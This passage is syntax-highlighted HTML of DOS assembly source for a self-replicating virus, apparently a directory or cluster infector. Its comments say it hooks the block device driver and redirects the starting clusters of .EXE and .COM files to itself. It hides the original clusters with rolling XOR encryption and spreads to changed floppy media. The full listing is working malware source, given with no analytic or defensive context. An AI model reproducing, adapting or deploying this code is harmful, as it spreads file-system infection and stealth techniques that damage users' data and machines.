         </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">_read_</span><span class="sc0">                           </span><span class="sc1">; If we didn't infect, then</span><span class="sc0">
                                                </span><span class="sc1">; leave the routine.  Oh</span><span class="sc0">
                                                </span><span class="sc1">; welp-o.</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">write</span><span class="sc0">                            </span><span class="sc1">; Update the FAT</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">_read_</span><span class="sc0">                           </span><span class="sc1">; Quit if there's an error</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">driver</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">_read_</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">                               </span><span class="sc1">; Multiply by sectors/cluster</span><span class="sc0">
                                                </span><span class="sc1">; to find the sector of the</span><span class="sc0">
                                                </span><span class="sc1">; write</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">              </span><span class="sc1">; Byte/sector count</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; Starting sector #</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">less</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; Flag extended partition</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; Handle the sector of the</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; extended partition</span><span class="sc0">
</span><span class="sc5">less</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">; Transfer address segment</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc2">100h</span><span class="sc0">                    </span><span class="sc1">; and the offset (duh)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">write</span><span class="sc0">                            </span><span class="sc1">; Zopy ourselves!</span><span class="sc0">
                                                </span><span class="sc1">; (We want to travel)</span><span class="sc0">
</span><span class="sc5">_read_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">std</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; Restore device driver header</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                             </span><span class="sc1">; from the stack</span><span class="sc0">
</span><span class="sc5">load</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">load</span><span class="sc0">
</span><span class="sc5">_read</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">in_</span><span class="sc0">                              </span><span class="sc1">; Call original device handler</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
</span><span class="sc5">_inf_sec</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Bytes/Sector</span><span class="sc0">
         </span><span class="sc6">lds</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; DS:SI = pointer to buffer</span><span class="sc0">
         </span><span class="sc6">sal</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                            </span><span class="sc1">; Multiply by 512</span><span class="sc0">
                                                </span><span class="sc1">; DI = byte count</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                            </span><span class="sc1">; Go to address in the buffer</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                            </span><span class="sc1">; Flag for an infection in</span><span class="sc0">
                                                </span><span class="sc1">; function find</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">find</span><span class="sc0">                             </span><span class="sc1">; Infect the directory</span><span class="sc0">
         </span><span class="sc6">jcxz</span><span class="sc0">  </span><span class="sc5">no_inf</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">write</span><span class="sc0">                            </span><span class="sc1">; Write it back to the disk</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc0">          </span><span class="sc1">; Clear error bit in status</span><span class="sc0">
                                                </span><span class="sc1">; word</span><span class="sc0">
</span><span class="sc5">no_inf</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">                               </span><span class="sc1">; Flag for a decryption in</span><span class="sc0">
                                                </span><span class="sc1">; function find</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">find</span><span class="sc0">                             </span><span class="sc1">; Return right information to</span><span class="sc0">
                                                </span><span class="sc1">; calling program</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">ppp</span><span class="sc0">

</span><span class="sc1">;--------Subroutines</span><span class="sc0">

</span><span class="sc5">find</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; Check filename extension</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"XE"</span><span class="sc0">                          </span><span class="sc1">; in directory structure</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">com</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">found</span><span class="sc0">
</span><span class="sc5">com</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"OC"</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">go_on</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc3">"M"</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">go_on</span><span class="sc0">
</span><span class="sc5">found</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc4">],</span><span class="sc2">0ffc0h</span><span class="sc0"> </span><span class="sc1">; &gt;4MB           ; Check file size high word</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">go_on</span><span class="sc0">                            </span><span class="sc1">; to see if it is too big</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],</span><span class="sc2">03ff8h</span><span class="sc0"> </span><span class="sc1">; &lt;2048B         ; Check file size low word</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">go_on</span><span class="sc0">                            </span><span class="sc1">; to see if it is too small</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0bh</span><span class="sc4">],</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc0">            </span><span class="sc1">; Check attribute for subdir,</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">go_on</span><span class="sc0">                            </span><span class="sc1">; volume label or system file</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                            </span><span class="sc1">; If none of these, check DX</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc9">rest</span><span class="sc0">                             </span><span class="sc1">; If not 0, decrypt</span><span class="sc0">
</span><span class="sc5">pointer</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">                         </span><span class="sc1">; mov ax, XX modified elsewhere</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; Check for same starting</span><span class="sc0">
                                                </span><span class="sc1">; cluster number as us</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">go_on</span><span class="sc0">                            </span><span class="sc1">; If it is, then try another</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; Otherwise make it point to</span><span class="sc0">
                                                </span><span class="sc1">; us.</span><span class="sc0">
</span><span class="sc5">gad</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">                         </span><span class="sc1">; Encrypt their starting</span><span class="sc0">
                                                </span><span class="sc1">; cluster</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; And put it in area reserved</span><span class="sc0">
                                                </span><span class="sc1">; by DOS for no purpose</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">go_on</span><span class="sc0">                            </span><span class="sc1">; Try another file</span><span class="sc0">
</span><span class="sc9">rest</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                            </span><span class="sc1">; Disinfect the file</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; Get starting cluster</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">gad</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; Decrypt the starting cluster</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; and put it back</span><span class="sc0">
</span><span class="sc5">go_on</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2eh</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                       </span><span class="sc1">; rol cs:[gad+1], 1</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gad</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">; Change encryption and</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">                            </span><span class="sc1">; go to next file</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                            </span><span class="sc1">; If it is not past the end of</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">find</span><span class="sc0">                             </span><span class="sc1">; the buffer, then try again</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">                                    </span><span class="sc1">; Otherwise quit</span><span class="sc0">

</span><span class="sc5">check</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; ah = unit code (block device</span><span class="sc0">
                                                </span><span class="sc1">;                 only)</span><span class="sc0">
</span><span class="sc5">drive</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">; cmp ah, XX can change.</span><span class="sc0">
                                                </span><span class="sc1">; Compare with the last call</span><span class="sc0">
                                                </span><span class="sc1">; -1 is just a dummy</span><span class="sc0">
                                                </span><span class="sc1">; impossible value that will</span><span class="sc0">
                                                </span><span class="sc1">; force the change to be true</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">drive</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">         </span><span class="sc1">; Save this call's drive</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">changed</span><span class="sc0">                          </span><span class="sc1">; If not the same as last call</span><span class="sc0">
                                                </span><span class="sc1">; media has changed</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">; If it is the same physical</span><span class="sc0">
                                                </span><span class="sc1">; drive, see if floppy has</span><span class="sc0">
                                                </span><span class="sc1">; been changed</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">; Tell original driver to do a</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">in_</span><span class="sc0">                              </span><span class="sc1">; media check (block only)</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; Returns 1 in [bx+0eh] if</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">; media has not been changed</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">                        </span><span class="sc1">; Restore command code</span><span class="sc0">
</span><span class="sc5">changed</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">                                    </span><span class="sc1">; CF,ZF set if media has not</span><span class="sc0">
                                                </span><span class="sc1">; been changed, not set if</span><span class="sc0">
                                                </span><span class="sc1">; has been changed or we don't</span><span class="sc0">
                                                </span><span class="sc1">; know</span><span class="sc0">
</span><span class="sc5">write</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">             </span><span class="sc1">; If we want OUTPUT, go to</span><span class="sc0">
         </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">in_</span><span class="sc0">                              </span><span class="sc1">; original device handler</span><span class="sc0">
                                                </span><span class="sc1">; and return to caller</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">; Otherwise, request INPUT</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                            </span><span class="sc1">; DS = our segment</span><span class="sc0">
</span><span class="sc5">modify</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">                         </span><span class="sc1">; Address is changed elsewhere</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i13pr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">in_</span><span class="sc0">                              </span><span class="sc1">; Call original device handler</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">driver</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; One sector</span><span class="sc0">
</span><span class="sc5">in_</span><span class="sc4">:</span><span class="sc0">                                            </span><span class="sc1">; in_ first calls the strategy</span><span class="sc0">
                                                </span><span class="sc1">; of the original device</span><span class="sc0">
                                                </span><span class="sc1">; driver and then calls the</span><span class="sc0">
                                                </span><span class="sc1">; interrupt handler</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">09ah</span><span class="sc0">                             </span><span class="sc1">; CALL FAR PTR</span><span class="sc0">
</span><span class="sc5">str_block</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">                            </span><span class="sc1">; address</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">09ah</span><span class="sc0">                             </span><span class="sc1">; CALL FAR PTR</span><span class="sc0">
</span><span class="sc5">int_block</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">                            </span><span class="sc1">; address</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">           </span><span class="sc1">; Was there an error?</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">convert</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ff0h</span><span class="sc0">                         </span><span class="sc1">; 0FFF0h if 12 bit FAT</span><span class="sc0">
         </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">fat_16</span><span class="sc0">                           </span><span class="sc1">; 0FF0h = reserved cluster</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                             </span><span class="sc1">; 12 bit FAT</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">gad</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">        </span><span class="sc1">; Change the encryption value</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc0">                               </span><span class="sc1">; Multiply by 3 and</span><span class="sc0">
         </span><span class="sc6">shr</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                             </span><span class="sc1">; divide by 2</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0fffh</span><span class="sc0">                         </span><span class="sc1">; Mark it EOF (low 12 bits)</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">   </span><span class="sc5">cont</span><span class="sc0">                             </span><span class="sc1">; if it is even, continue</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0fff0h</span><span class="sc0">                        </span><span class="sc1">; otherwise, mark it EOF (high</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">cont</span><span class="sc0">                       </span><span class="sc1">; 12 bits) and then continue</span><span class="sc0">
</span><span class="sc5">fat_16</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                             </span><span class="sc1">; 16 bit FAT</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc0">                               </span><span class="sc1">; Double cluster #</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">                        </span><span class="sc1">; Mark it as end of file</span><span class="sc0">
</span><span class="sc5">cont</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc0">                               </span><span class="sc1">; AX = sector number</span><span class="sc0">
                                                </span><span class="sc1">; (relative to start of FAT)</span><span class="sc0">
                                                </span><span class="sc1">; DX = offset in sector AX</span><span class="sc0">
</span><span class="sc5">header</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">; Increment AX to account for</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">                                    </span><span class="sc1">; boot record</span><span class="sc0">

</span><span class="sc5">counter</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

         </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">842h</span><span class="sc0">                             </span><span class="sc1">; Attribute</span><span class="sc0">
                                                </span><span class="sc1">;  Block device</span><span class="sc0">
